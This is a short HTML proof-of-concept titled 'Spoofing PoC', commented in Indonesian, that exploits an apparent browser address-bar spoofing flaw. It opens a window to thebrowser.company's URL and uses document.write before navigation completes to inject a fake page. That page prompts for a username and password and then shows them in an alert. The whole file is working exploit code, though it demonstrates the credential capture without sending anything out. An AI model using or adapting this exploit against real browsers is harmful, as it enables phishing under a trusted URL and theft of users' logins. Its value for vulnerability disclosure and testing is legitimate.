<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Spoofing PoC</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }

    body > button {
      padding: 12px 24px;
      font-size: 18px;
    }
  </style>
</head>

<body>
  <button onclick="spoof()">Click to spoof</button>

  <script>
    function spoof() {
      // Buka page baru pointing ke target (akan menjadi spoofed URL)
      let win = window.open("https://thebrowser.company/", "_blank");

      // Setelah 50ms, injeksikan konten sebelum navigasi selesai
      setTimeout(() => {
        try {
          win.document.write(`
  <h1>This is not The Browser Company!</h1>
<button onclick="
  let username = prompt('Enter your username');
  let password = prompt('Enter your password');
  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
">Click me</button>
            `);
          win.document.close();
        } catch (e) {
          console.warn("Blocked by browser protections:", e);
        }
      }, 50);
    }
  </script>
</body>

</html>
